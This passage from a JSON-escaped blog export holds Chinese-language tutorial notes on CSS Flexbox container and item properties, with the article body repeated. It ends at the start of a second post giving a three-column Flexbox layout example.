title=\"align-items：定义了项目在交叉轴上的对齐方式\"></a>align-items：定义了项目在交叉轴上的对齐方式</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">align-items</span>: flex-start | flex-end | center | baseline | strech;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值: stretch 如果项目未设置高度或设为 auto，将占满整个容器的高度 </p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/13.png\" alt=\"\"></p>\n<p>flex-start：交叉轴的起点对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/14.png\" alt=\"\"></p>\n<p>flex-end：交叉轴的终点对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/15.png\" alt=\"\"></p>\n<p>center：交叉轴的中点对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/16.png\" alt=\"\"></p>\n<p>baseline: 项目的第一行文字的基线对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/17.png\" alt=\"\"></p>\n<h3 id=\"align-conten-定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用\"><a href=\"#align-conten-定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用\" class=\"headerlink\" title=\"align-conten: 定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用\"></a>align-conten: 定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">align-content</span>: flex-start | flex-end | center | space-between | space-around | stretch;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"五、Flex-项目属性\"><a href=\"#五、Flex-项目属性\" class=\"headerlink\" title=\"五、Flex 项目属性\"></a>五、Flex 项目属性</h2><p>有六种属性可运用在项目上</p>\n<ul>\n<li>order</li>\n<li>flex-basis</li>\n<li>flex-grow</li>\n<li>flex-shrink</li>\n<li>flex </li>\n<li>align-self</li>\n</ul>\n<h3 id=\"order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。\"><a href=\"#order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。\" class=\"headerlink\" title=\"order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。\"></a>order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">order</span>: &lt;integer&gt;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/18.png\" alt=\"\"></p>\n<h3 id=\"flex-basis-定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间\"><a href=\"#flex-basis-定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间\" class=\"headerlink\" title=\"flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间\"></a>flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-basis</span>: &lt;length&gt; | auto;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值：auto，即项目本来的大小, 这时候 item 的宽高取决于 width 或 height 的值</p>\n<p><strong>flex-basis 需要跟 flex-grow 和 flex-shrink 配合使用才能发挥效果</strong></p>\n<h3 id=\"flex-grow-定义项目的放大比例\"><a href=\"#flex-grow-定义项目的放大比例\" class=\"headerlink\" title=\"flex-grow: 定义项目的放大比例\"></a>flex-grow: 定义项目的放大比例</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-grow</span>: &lt;number&gt;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值: 0，即如果存在剩余空间，也不放大</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/19.png\" alt=\"\"></p>\n<p>如果所有项目的 flex-grow 属性都为 1，则它们将等分剩余空间。(如果有的话)<br>如果一个项目的 flex-grow 属性为 2，其他项目都为 1，则前者占据的剩余空间将比其他项多一倍。</p>\n<h3 id=\"flex-shrink-定义了项目的缩小比例\"><a href=\"#flex-shrink-定义了项目的缩小比例\" class=\"headerlink\" title=\"flex-shrink: 定义了项目的缩小比例\"></a>flex-shrink: 定义了项目的缩小比例</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-shrink</span>: &lt;number&gt;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值：1，即如果空间不足，该项目将缩小</p>\n<p><strong>负值对该属性无效</strong></p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/20.png\" alt=\"\"></p>\n<p>同理可得：</p>\n<p>如果所有项目的 flex-shrink 属性都为 1，当空间不足时，都将等比例缩小。<br>如果一个项目的 flex-shrink 属性为 0，其他项目都为 1，则空间不足时，前者不缩小。</p>\n<h3 id=\"flex-flex-grow-flex-shrink-和-flex-basis的简写\"><a href=\"#flex-flex-grow-flex-shrink-和-flex-basis的简写\" class=\"headerlink\" title=\"flex: flex-grow, flex-shrink 和 flex-basis的简写\"></a>flex: flex-grow, flex-shrink 和 flex-basis的简写</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex</span>: none | [ &lt;<span class=\"string\">'flex-grow'</span>&gt; &lt;<span class=\"string\">'flex-shrink'</span>&gt;? || &lt;<span class=\"string\">'flex-basis'</span>&gt; ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值：0 1 auto， 即不放大，可缩小，大小与 width、height 有关 </p>\n<p>快捷值：auto (1 1 auto) 和 none (0 0 auto)</p>\n<p>建议优先使用这个属性，而不是单独写三个分离的属性。</p>\n<p>flex-grow 和 flex-shrink 可缺省，故可单单设置: flex: 2;</p>\n<p>grow 和 shrink 是一对双胞胎，grow 表示伸张因子，shrink 表示是收缩因子。</p>\n<p>grow 在 flex 容器下的子元素的宽度和比容器和小的时候起作用。 grow 定义了子元素的宽度增长因子，容器中除去子元素之和剩下的宽度会按照各个子元素的 grow 值进行平分加大各个子元素上。</p>\n<h4 id=\"公式：\"><a href=\"#公式：\" class=\"headerlink\" title=\"公式：\"></a>公式：</h4><p>计算容器还剩空间</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">available_space (容器还剩的空间）= container_size (容器宽度) - flex_item_total (子元素宽度之和)</span><br></pre></td></tr></table></figure>\n<p>计算增长单位</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grow_unit (增长单位) = available_space / flex_grow_total(子元素增长因子之和)</span><br><span class=\"line\">``` </span><br><span class=\"line\"></span><br><span class=\"line\">得到子元素的宽度</span><br><span class=\"line\"></span><br><span class=\"line\">```code</span><br><span class=\"line\">flex-item-width (子元素计算得到的宽度) = flex-basis + grow-unit * flex-grow</span><br></pre></td></tr></table></figure>\n<h3 id=\"align-self-允许单个项目有与其他项目不一样的对齐方式\"><a href=\"#align-self-允许单个项目有与其他项目不一样的对齐方式\" class=\"headerlink\" title=\"align-self: 允许单个项目有与其他项目不一样的对齐方式\"></a>align-self: 允许单个项目有与其他项目不一样的对齐方式</h3><p>单个项目覆盖 align-items 定义的属性<br>默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">align-self</span>: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该属性可能取6个值，除了auto，其他都与align-items属性完全一致。</p>\n<hr>\n\n<p>讲到这里，flex 布局的基本语法就记录完毕。</p>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html?utm_source=tuicool\" target=\"_blank\" rel=\"external\">Flex 布局教程：语法篇 - 阮一峰的网络日志</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000002616717#articleHeader11\" target=\"_blank\" rel=\"external\">flexbox：更加优雅的Web布局</a></li>\n<li><a href=\"http://www.html-js.com/article/2582\" target=\"_blank\" rel=\"external\">CSS3 Flexbox</a></li>\n</ul>\n","excerpt":"","more":"<h2 id=\"一、Flexbox-是什么呢？\"><a href=\"#一、Flexbox-是什么呢？\" class=\"headerlink\" title=\"一、Flexbox 是什么呢？\"></a>一、Flexbox 是什么呢？</h2><p>谈到页面布局，相信很多人都依赖于 display + position + float 属性来实现，但是这些都不够语义化，而且代码写起来不够简洁优雅。</p>\n<p>Flexbox 是 flexible box 的缩写，为“ 弹性布局 ”，<strong>它可以更加有语义化地实现各种页面布局，给盒模型之间提供很大的灵活性</strong></p>\n<p>Flexbox 一种设计来实现更复杂的页面版面布局，它本质上就是个<strong>盒模型</strong>的延伸，Flexbox 进一步去规范了这些盒模型之间彼此的相对关系。</p>\n<p>Flex 布局将成为未来布局的首选方案，关于兼容性：</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/1.jpg\" alt=\"\"></p>\n<p>如果不考虑 IE 低版本浏览器，那就放心地使用 flexbox 来进行布局吧！</p>\n<h2 id=\"二、Flex-基本概念\"><a href=\"#二、Flex-基本概念\" class=\"headerlink\" title=\"二、Flex 基本概念\"></a>二、Flex 基本概念</h2><p>下面简单介绍一下 flex 中一些常用术语</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/2.jpg\" alt=\"\"></p>\n<p>容器默认存在两条轴，水平主轴 (main axis) 和垂直的交叉轴 (cross axis) ；主轴的开始位置 (main start)，交叉轴的开始位置 (cross start)；</p>\n<p>每个项目占据的主轴空间为 (main size), 占据的交叉轴的空间为 (cross size);</p>\n<h2 id=\"三、Flex-容器\"><a href=\"#三、Flex-容器\" class=\"headerlink\" title=\"三、Flex 容器\"></a>三、Flex 容器</h2><p>首先，实现 flex 布局需要指定一个容器，任何一个容器都可以指定为 flex 布局，这样容器内的元素就可以实现 flex 布局。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.container&#123;</span><br><span class=\"line\">\tdisplay: flex | inline-flex;   //可以有两种取值</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>分别生成一个 block-level 或者 inline-level 的 flex 容器盒子。</p>\n<p>webkit 内核的浏览器需要加上 -webkit- 前缀</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">display</span>: -webkit-flex; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>注意：设为 flex 布局后，子元素的 float、 clear、 vertical-align 属性将会失效</strong></p>\n<h2 id=\"四、Flex-容器属性\"><a href=\"#四、Flex-容器属性\" class=\"headerlink\" title=\"四、Flex 容器属性\"></a>四、Flex 容器属性</h2><p>有六种属性可以设在容器 container 中</p>\n<ul>\n<li>flex-direction</li>\n<li>flex-wrap</li>\n<li>flex-flow</li>\n<li>justify-content</li>\n<li>align-items</li>\n<li>align-content</li>\n</ul>\n<h3 id=\"flex-direction-决定主轴的方向-即项目的排列方向\"><a href=\"#flex-direction-决定主轴的方向-即项目的排列方向\" class=\"headerlink\" title=\"flex-direction: 决定主轴的方向(即项目的排列方向)\"></a>flex-direction: 决定主轴的方向(即项目的排列方向)</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-direction</span>: row | row-reverse | column | column-reverse; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值: row，主轴为水平方向，起点在左端    </p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/1.png\" alt=\"\"></p>\n<p>row-reverse：主轴为水平方向，起点在右端  </p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/2.png\" alt=\"\"></p>\n<p>column：主轴为垂直方向，起点在上沿  </p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/3.png\" alt=\"\"></p>\n<p>column-reverse：主轴为垂直方向，起点在下沿</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/4.png\" alt=\"\"></p>\n<h3 id=\"flex-wrap-决定容器内项目是否可换行\"><a href=\"#flex-wrap-决定容器内项目是否可换行\" class=\"headerlink\" title=\"flex-wrap: 决定容器内项目是否可换行\"></a>flex-wrap: 决定容器内项目是否可换行</h3><p>默认情况下，项目都排在主轴线上，使用 flex-wrap 可实现项目换行</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值：nowrap 不换行</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/5.png\" alt=\"\"></p>\n<p>wrap: 项目宽度综合超出容器时换行，第一行在上方</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/6.png\" alt=\"\"></p>\n<p>wrap-reverse：换行，第一行在下方</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/7.png\" alt=\"\"></p>\n<h3 id=\"flex-flow-flex-direction-和-flex-wrap-的简写形式\"><a href=\"#flex-flow-flex-direction-和-flex-wrap-的简写形式\" class=\"headerlink\" title=\"flex-flow: flex-direction 和 flex-wrap 的简写形式\"></a>flex-flow: flex-direction 和 flex-wrap 的简写形式</h3><p>默认值为: row nowrap</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-flow</span>: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"justify-content：定义了项目在主轴的对齐方式。\"><a href=\"#justify-content：定义了项目在主轴的对齐方式。\" class=\"headerlink\" title=\"justify-content：定义了项目在主轴的对齐方式。\"></a>justify-content：定义了项目在主轴的对齐方式。</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">justify-content</span>: flex-start | flex-end | center | space-between | space-around;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值: flex-start 左对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/8.png\" alt=\"\"></p>\n<p>flex-end：右对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/9.png\" alt=\"\"></p>\n<p>center： 居中</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/10.png\" alt=\"\"></p>\n<p>space-between：两端对齐，项目之间的间隔都相等。</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/11.png\" alt=\"\"></p>\n<p>space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/12.png\" alt=\"\"></p>\n<h3 id=\"align-items：定义了项目在交叉轴上的对齐方式\"><a href=\"#align-items：定义了项目在交叉轴上的对齐方式\" class=\"headerlink\" title=\"align-items：定义了项目在交叉轴上的对齐方式\"></a>align-items：定义了项目在交叉轴上的对齐方式</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">align-items</span>: flex-start | flex-end | center | baseline | strech;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值: stretch 如果项目未设置高度或设为 auto，将占满整个容器的高度 </p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/13.png\" alt=\"\"></p>\n<p>flex-start：交叉轴的起点对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/14.png\" alt=\"\"></p>\n<p>flex-end：交叉轴的终点对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/15.png\" alt=\"\"></p>\n<p>center：交叉轴的中点对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/16.png\" alt=\"\"></p>\n<p>baseline: 项目的第一行文字的基线对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/17.png\" alt=\"\"></p>\n<h3 id=\"align-conten-定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用\"><a href=\"#align-conten-定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用\" class=\"headerlink\" title=\"align-conten: 定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用\"></a>align-conten: 定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">align-content</span>: flex-start | flex-end | center | space-between | space-around | stretch;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"五、Flex-项目属性\"><a href=\"#五、Flex-项目属性\" class=\"headerlink\" title=\"五、Flex 项目属性\"></a>五、Flex 项目属性</h2><p>有六种属性可运用在项目上</p>\n<ul>\n<li>order</li>\n<li>flex-basis</li>\n<li>flex-grow</li>\n<li>flex-shrink</li>\n<li>flex </li>\n<li>align-self</li>\n</ul>\n<h3 id=\"order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。\"><a href=\"#order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。\" class=\"headerlink\" title=\"order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。\"></a>order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">order</span>: &lt;integer&gt;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/18.png\" alt=\"\"></p>\n<h3 id=\"flex-basis-定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间\"><a href=\"#flex-basis-定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间\" class=\"headerlink\" title=\"flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间\"></a>flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-basis</span>: &lt;length&gt; | auto;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值：auto，即项目本来的大小, 这时候 item 的宽高取决于 width 或 height 的值</p>\n<p><strong>flex-basis 需要跟 flex-grow 和 flex-shrink 配合使用才能发挥效果</strong></p>\n<h3 id=\"flex-grow-定义项目的放大比例\"><a href=\"#flex-grow-定义项目的放大比例\" class=\"headerlink\" title=\"flex-grow: 定义项目的放大比例\"></a>flex-grow: 定义项目的放大比例</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-grow</span>: &lt;number&gt;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值: 0，即如果存在剩余空间，也不放大</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/19.png\" alt=\"\"></p>\n<p>如果所有项目的 flex-grow 属性都为 1，则它们将等分剩余空间。(如果有的话)<br>如果一个项目的 flex-grow 属性为 2，其他项目都为 1，则前者占据的剩余空间将比其他项多一倍。</p>\n<h3 id=\"flex-shrink-定义了项目的缩小比例\"><a href=\"#flex-shrink-定义了项目的缩小比例\" class=\"headerlink\" title=\"flex-shrink: 定义了项目的缩小比例\"></a>flex-shrink: 定义了项目的缩小比例</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-shrink</span>: &lt;number&gt;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值：1，即如果空间不足，该项目将缩小</p>\n<p><strong>负值对该属性无效</strong></p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/20.png\" alt=\"\"></p>\n<p>同理可得：</p>\n<p>如果所有项目的 flex-shrink 属性都为 1，当空间不足时，都将等比例缩小。<br>如果一个项目的 flex-shrink 属性为 0，其他项目都为 1，则空间不足时，前者不缩小。</p>\n<h3 id=\"flex-flex-grow-flex-shrink-和-flex-basis的简写\"><a href=\"#flex-flex-grow-flex-shrink-和-flex-basis的简写\" class=\"headerlink\" title=\"flex: flex-grow, flex-shrink 和 flex-basis的简写\"></a>flex: flex-grow, flex-shrink 和 flex-basis的简写</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex</span>: none | [ &lt;<span class=\"string\">'flex-grow'</span>&gt; &lt;<span class=\"string\">'flex-shrink'</span>&gt;? || &lt;<span class=\"string\">'flex-basis'</span>&gt; ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值：0 1 auto， 即不放大，可缩小，大小与 width、height 有关 </p>\n<p>快捷值：auto (1 1 auto) 和 none (0 0 auto)</p>\n<p>建议优先使用这个属性，而不是单独写三个分离的属性。</p>\n<p>flex-grow 和 flex-shrink 可缺省，故可单单设置: flex: 2;</p>\n<p>grow 和 shrink 是一对双胞胎，grow 表示伸张因子，shrink 表示是收缩因子。</p>\n<p>grow 在 flex 容器下的子元素的宽度和比容器和小的时候起作用。 grow 定义了子元素的宽度增长因子，容器中除去子元素之和剩下的宽度会按照各个子元素的 grow 值进行平分加大各个子元素上。</p>\n<h4 id=\"公式：\"><a href=\"#公式：\" class=\"headerlink\" title=\"公式：\"></a>公式：</h4><p>计算容器还剩空间</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">available_space (容器还剩的空间）= container_size (容器宽度) - flex_item_total (子元素宽度之和)</span><br></pre></td></tr></table></figure>\n<p>计算增长单位</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grow_unit (增长单位) = available_space / flex_grow_total(子元素增长因子之和)</span><br><span class=\"line\">``` </span><br><span class=\"line\"></span><br><span class=\"line\">得到子元素的宽度</span><br><span class=\"line\"></span><br><span class=\"line\">```code</span><br><span class=\"line\">flex-item-width (子元素计算得到的宽度) = flex-basis + grow-unit * flex-grow</span><br></pre></td></tr></table></figure>\n<h3 id=\"align-self-允许单个项目有与其他项目不一样的对齐方式\"><a href=\"#align-self-允许单个项目有与其他项目不一样的对齐方式\" class=\"headerlink\" title=\"align-self: 允许单个项目有与其他项目不一样的对齐方式\"></a>align-self: 允许单个项目有与其他项目不一样的对齐方式</h3><p>单个项目覆盖 align-items 定义的属性<br>默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.item</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">align-self</span>: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该属性可能取6个值，除了auto，其他都与align-items属性完全一致。</p>\n<hr>\n\n<p>讲到这里，flex 布局的基本语法就记录完毕。</p>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html?utm_source=tuicool\">Flex 布局教程：语法篇 - 阮一峰的网络日志</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000002616717#articleHeader11\">flexbox：更加优雅的Web布局</a></li>\n<li><a href=\"http://www.html-js.com/article/2582\">CSS3 Flexbox</a></li>\n</ul>\n"},{"layout":"post","title":"CSS - Flexbox 实例","date":"2016-03-13T04:00:00.000Z","author":"Lindz","header-img":"img/13.jpg","_content":"\n介绍一些 Flexbox 在页面布局上的应用\n\n注：这里不再阐述原理及实现细节，若想学习 Flexbox 如何使用，可以查看 [CSS - Flex 布局学习笔记](http://www.happylindz.com/2016/03/12/learn-css-flexbox/)\n\n## 一、实现三列自适应布局\n\nhtml 代码：\n\n```html\n<div class=\"container\">\n    <div class=\"main\"></div>\n    <div class=\"left\"></div>\n    <div class=\"right\"></div>\n</div>\n```\n\ncss 代码：\n\n```css\n.container{\n    display: flex;\n}\n.left{\n    width: 100px;\n    background: orange;\n    order: -1;      //使 .left 排列在 .main左边\n}\n.right{\n    width: 200px;\n    background: lavender;\n}\n.main{\n    background: mediumaquamarine;\n    flex: 1;\n    height: 300px;         //假设内容有 300px 高度\n    margin-left: 20px;\n    margin-right: 10px;\n}\n```\n\n效果：\n\n![](/assets/2016-03-13-css-flexbox/1.png)\n\n不仅实现了三列布局，中间内容自适应，并且 .main 的内容优先加载，并且设置布局十分简单。\n\n## 